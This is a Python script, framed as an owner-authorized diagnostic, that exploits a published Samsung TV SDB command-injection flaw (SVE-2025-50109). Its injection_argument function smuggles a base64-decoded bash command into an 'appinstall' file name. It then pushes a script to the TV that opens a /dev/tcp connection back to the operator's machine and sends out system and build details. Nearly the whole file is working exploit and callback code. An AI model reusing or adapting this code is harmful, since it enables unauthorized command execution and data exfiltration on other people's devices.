#!/usr/bin/env python3
"""Owner-authorized Samsung TV prerequisite check. Python 3.8+, standard library.

Uses the published SVE-2025-50109 SDB command route from
https://github.com/chris-ritsen/samsung-tv-root (Unlicense).
Reads prerequisites only; does not acquire root, install an app, change Home,
disable services, or flash firmware. A temporary script is pushed to the SDK
directory and removes itself. Small duplicate-execution guards remain in /tmp
until the TV reboots. No information is sent to the Internet.
"""
import argparse
import base64
import ipaddress
from pathlib import Path
import secrets
import socket
import subprocess
import sys
import tempfile
import threading
import time

sys.path.insert(0, str(Path(__file__).resolve().parent / "scripts"))
from tv_config import add_device_arguments, load_device


READ_COMMANDS = r'''id
printf '\nKERNEL\n'; uname -r; uname -m
printf '\nTIZEN\n'; cat /etc/tizen-release
grep -E '^(BUILD_ID|BUILD_VERSION|TIZEN_VERSION)=' /etc/tizen-build.conf
printf '\nFILE_CAPABILITIES\n'
getcap /usr/bin/dotnet /usr/sbin/sdbd-tarlauncher
printf '\nDOTNET_RUNTIMES\n'
if test -x /usr/bin/dotnet; then /usr/bin/dotnet --list-runtimes; else printf 'dotnet missing\n'; fi
printf '\nARCHIVE_SUPPORT\n'
/usr/bin/tar --help | grep -- --to-command
printf '\nHOME_LIBRARIES\n'
for p in /usr/lib/libcapi-appfw-app-control.so* /usr/lib/libcapi-appfw-app-operation-tv.so* /usr/lib/libapp-context-manager.so*; do
  if test -e "$p"; then printf '%s\n' "$p"; fi
done
'''


def injection_argument(command):
    guard = '/tmp/s-' + secrets.token_hex(8)
    script = '/bin/mkdir ' + guard + ' 2>/dev/null&&{ ' + command + ';}'
    encoded = base64.b64encode(script.encode()).decode()
    arg = '0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
    if len(arg.encode()) > 510:
        raise RuntimeError('Diagnostic command exceeds SDB transport limit')
    return arg


def run_check(sdb, tv, callback_ip=None):
    serial = tv + ':26101'

    def run(*args, timeout=15):
        return subprocess.run([str(sdb)] + list(args), capture_output=True,
                              text=True, timeout=timeout)

    def inject(command, timeout=15):
        return run('-s', serial, 'shell', injection_argument(command), timeout=timeout)

    connected = run('connect', serial)
    devices = run('devices')
    if not any(line.split()[:2] == [serial, 'device'] for line in devices.stdout.splitlines()):
        raise RuntimeError('TV is not connected: ' + connected.stdout + connected.stderr)

    print('Testing restricted command access (about 2 seconds)...', flush=True)
    timings = []
    for command in ('/bin/true', '/bin/sleep 2'):
        started = time.monotonic()
        result = inject(command)
        timings.append(time.monotonic() - started)
        if result.returncode not in (0, 1):
            raise RuntimeError('SDB command failed: ' + result.stdout + result.stderr)
    if timings[1] - timings[0] < 1.5:
        raise RuntimeError('Command access NOT confirmed. Delay difference: %.2fs. '
                           'Stop here; no root attempt or Home change was made.' % (timings[1] - timings[0]))

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((tv, 9))
        mac = callback_ip or route.getsockname()[0]
    token = secrets.token_hex(16)
    remote = '/home/owner/share/tmp/sdk_tools/.home-diagnose-' + secrets.token_hex(8) + '.sh'
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind((mac, 0))
        listener.listen(2)
        listener.settimeout(25)
        port = listener.getsockname()[1]
        script = ("trap '/bin/rm -f " + remote + "' EXIT\n" +
                  'exec 3<>/dev/tcp/' + mac + '/' + str(port) + ' || exit 1\n' +
                  "printf '" + token + "\\n' >&3\n" +
                  '{\n' + READ_COMMANDS + "printf '\\nDIAGNOSE_COMPLETE\\n'\n} >&3 2>&3\nexec 3>&-\n")
        with tempfile.TemporaryDirectory(prefix='samsung-home-check-') as directory:
            local = Path(directory) / 'diagnose.sh'
            local.write_text(script)
            pushed = run('-s', serial, 'push', str(local), remote)
            if pushed.returncode != 0 or 'error:' in (pushed.stdout + pushed.stderr).lower():
                raise RuntimeError('Cannot stage diagnostic: ' + pushed.stdout + pushed.stderr)
        state = {}

        def launch():
            try:
                state['result'] = inject('. ' + remote, timeout=40)
            except Exception as error:
                state['error'] = str(error)

        worker = threading.Thread(target=launch, daemon=True)
        worker.start()
        print('Reading prerequisites; waiting for TV callback on ' + mac + ':' + str(port), flush=True)
        try:
            connection, peer = listener.accept()
            with connection:
                if peer[0] != tv:
                    raise RuntimeError('Unexpected callback source; report discarded')
                connection.settimeout(20)
                report = b''
                while True:
                    data = connection.recv(8192)
                    if not data:
                        break
                    report += data
                    if len(report) > 65536:
                        raise RuntimeError('Oversized report discarded')
            first, sep, body = report.partition(b'\n')
            if not sep or first.decode() != token:
                raise RuntimeError('Callback authentication failed; report discarded')
            text = body.decode('utf-8', errors='replace')
            print('\n--- COPY THIS REPORT ---\n' + text, flush=True)
            if 'DIAGNOSE_COMPLETE' not in text:
                raise RuntimeError('Incomplete diagnostic report')
        finally:
            worker.join(timeout=2)
            try:
                inject('/bin/rm -f ' + remote, timeout=5)
            except Exception:
                print('Temporary script cleanup could not be confirmed: ' + remote)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    add_device_arguments(parser)
    args = parser.parse_args()
    try:
        device = load_device(args.tv, args.callback_ip, args.sdb)
    except (OSError, ValueError) as error:
        parser.error(str(error))
    try:
        run_check(device.sdb, device.tv_ip, device.callback_ip)
    except (OSError, RuntimeError, subprocess.TimeoutExpired) as error:
        print('\nDIAGNOSE_FAILED: ' + str(error), file=sys.stderr)
        return 1
    return 0


if __name__ == '__main__':
    sys.exit(main())
